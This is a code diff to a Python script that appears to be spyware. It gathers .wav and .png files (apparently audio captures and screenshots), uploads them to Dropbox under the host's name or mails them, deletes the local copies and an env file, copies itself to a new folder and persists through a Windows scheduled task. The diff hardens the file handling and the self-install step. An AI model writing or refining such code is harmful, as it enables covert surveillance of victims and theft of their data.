@@ -53,18 +53,20 @@ def send_mail_with_attachment(
 
 def get_wav_and_png_files(dest_folder):
     wav_and_png_files = []
-    for filename in os.listdir(dest_folder):
-        if filename.endswith(".wav") or filename.endswith(".png"):
-            wav_and_png_files.append(filename)
+    if os.path.exists(dest_folder) and os.path.isdir(dest_folder):
+        for filename in os.listdir(dest_folder):
+            if filename.endswith(".wav") or filename.endswith(".png"):
+                wav_and_png_files.append(filename)
 
     return wav_and_png_files
 
 
 def delete_wav_and_png_files(dest_folder):
-    for filename in os.listdir(dest_folder):
-        if filename.endswith(".wav") or filename.endswith(".png"):
-            file_path = os.path.join(dest_folder, filename)
-            os.remove(file_path)
+    if os.path.exists(dest_folder) and os.path.isdir(dest_folder):
+        for filename in os.listdir(dest_folder):
+            if filename.endswith(".wav") or filename.endswith(".png"):
+                file_path = os.path.join(dest_folder, filename)
+                os.remove(file_path)
 
 
 def remove_env_file():
@@ -91,9 +93,6 @@ def upload_to_dropbox(hostname, dbx, wav_and_png_files, dest_folder):
             return
 
 
-import subprocess
-
-
 def create_scheduled_task(executable_path, task_name):
     check_task_command = f'if (Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue) {{ exit 1 }} else {{ exit 0 }}'
 
@@ -117,6 +116,10 @@ def save_program_in_location(src_file, dest_folder):
         os.makedirs(dest_folder)
 
     dest_file = os.path.join(dest_folder, os.path.basename(src_file))
-    shutil.copy(src_file, dest_file)
-
+    
+    if not os.path.exists(dest_file):
+        shutil.copy(src_file, dest_file)
+    else:
+        print(f"File {dest_file} already exists.")
+    
     return dest_file
